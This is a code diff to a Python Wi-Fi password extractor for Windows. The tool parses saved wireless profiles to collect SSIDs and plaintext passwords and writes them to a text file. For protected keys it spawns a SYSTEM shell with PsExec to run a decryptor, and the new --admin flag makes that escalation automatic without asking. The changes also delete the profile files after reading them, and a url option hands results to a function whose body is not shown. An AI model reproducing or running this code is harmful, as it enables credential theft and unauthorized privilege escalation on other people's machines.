@@ -13,26 +13,28 @@ WIFIs = []
 @click.option('--no-txt', '-n', is_flag=True, help="No crea el archivo txt | Doesn't create the txt file")
 @click.option('--version', '-v', is_flag=True, help='Imprime la version | Prints the version')
 @click.option('--print-output', '-p', is_flag=True, help='Muestra la salida en la terminal | Shows the output in the terminal')
+@click.option('--admin', '-a', is_flag=True, help='Indica si la consola actual tiene privilegios de admin | Indicates if the current console has admin privileges')
 
 #funcion principal
-def main(url, no_txt, version,print_output):
+def main(url, no_txt, version,print_output, admin):
     if version == True:
         print('\nWIFI Extractor\n\nVersion 1.3\n')
+        print('\nGitHub repository: https://github.com/hrdax/WIFI_Extractor\n')
         sys.exit()
     elif url != '' and no_txt == True:
-        extractor(url, no_txt,print_output)
+        extractor(url, no_txt,print_output, admin)
         urlweb(url)
     elif url != '' and no_txt == False:
         if url == '-n':
             no_txt = True
-        extractor(url, no_txt,print_output)
+        extractor(url, no_txt,print_output, admin)
         urlweb(url)
     else:
-        extractor(url,no_txt, print_output)
+        extractor(url,no_txt, print_output, admin)
         print('\n[*] Done! \n\n[*] Hecho!\n')
 
 #hara el proceso de extraccion
-def extractor(url, no_txt,print_output):
+def extractor(url, no_txt,print_output, admin):
     #crea el archivo txt
     if no_txt == False:
         txt = open("Extracciones.txt", "w")
@@ -58,12 +60,14 @@ def extractor(url, no_txt,print_output):
         rt = tr.getroot()
         #try que verifica si el xml tiene contrasena extraible y si esque esta protegida
         try:
+
             ssid = rt[1][0][1].text
             contrasena = rt[4][0][1][2].text
             protected = rt[4][0][1][1].text
+            os.remove(archivo)
             #guarda el ssid y la pass
             ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
-
+            
 
             conta = conta + 1
 
@@ -75,12 +79,20 @@ def extractor(url, no_txt,print_output):
             if protected == "true":
                 print("[*] Detected encrypted Wifi do you want to try crack it? (You need admin privileges for this to be successful) SSID: "+ssid)
                 print("[*] Detectado Wifi encriptado, quieres intentar crackearlo? (Necesitas privilegios de administrador para que esto tenga exito) SSID: "+ssid)
-                ans = input("Y/N: ")
+                
+                if admin == True:
+                    ans = "Y"
+                    sleep(1)
+                    print("Y/N:", ans)
+
+                elif admin == False:
+                    ans = input("Y/N: ")
+
                 if ans == "Y" or ans == "y":
                     print("\n[*] Trying to get a system shell with the help of PsExec...\n")
                     print("[*] Tratando de obtener un system shell con la ayuda de PsExec...\n")
                     sleep(0.7)
-                    # Intentar obtener un shell de sistema con la ayuda de PsExec y ejecutar el wdecryptor
+                    # Intenta obtener un shell de sistema con la ayuda de PsExec y ejecuta el wdecryptor
                     try:
                         output = subprocess.run(['psexec.exe', '-accepteula', '-s', 'cmd', '/c', 'echo', '"[*]Done!|Hecho!"', '&','whoami'], capture_output=True, text=True, shell=False)
                         print(output.stdout)
@@ -96,8 +108,15 @@ def extractor(url, no_txt,print_output):
                         print("\n[*] Done!\n[*] Hecho!\n")
                     # Si no se pudo obtener un shell de sistema, muestra un mensaje de error
                     except:
-                        print("[-] Couldn't get a system shell, try running the program as administrator...\n")
-                        print("[-] No se pudo obtener un system shell, intenta ejecutar el programa como administrador...\n")
+                        if os.path.isfile("psexec.exe"):
+                            print("[-] Couldn't get a system shell, try running the program as administrator...\n")
+                            print("[-] No se pudo obtener un system shell, intenta ejecutar el programa como administrador...\n")
+                            pass
+                        else:
+                            print("[-] Couldn't find psexec.exe, make sure it's in the same folder as the program...\n")
+                            print("[-] No se pudo encontrar psexec.exe, asegurate de que este en la misma carpeta que el programa...\n")
+
+                        
                     
                     # Verifica si el archivo txt con la decryptacion existe
                     pdecryptedfile = r'C:\Windows\System32\decrypted.txt'
@@ -112,13 +131,14 @@ def extractor(url, no_txt,print_output):
                         os.remove(pdecryptedfile)
                 elif ans == "N" or ans == "n":
                     print("[*] Skipping...")
+                else:
+                    print("[*] Skipping...")
 
             
             #os.remove(archivo)        
             WIFIs.append(ssid_contrasena)
 
-            
-            
+
             try:
                 txt.write(WIFIs[conta-1]+"\n")
             except:
@@ -126,7 +146,7 @@ def extractor(url, no_txt,print_output):
 
         except:
             print("[-] Omitting detected WIFI without password(Open WIFI) or WIFI with WPA-Enterprise security... SSID: "+ssid+"\n[-] Omitiendo WIFI detectado sin contrasena(WIFI Libre) o con WPA-Enterprise security... SSID: "+ssid+"\n")
-            #os.remove(archivo)
+            os.remove(archivo)
 
     try: 
         #cierra el archivo txt
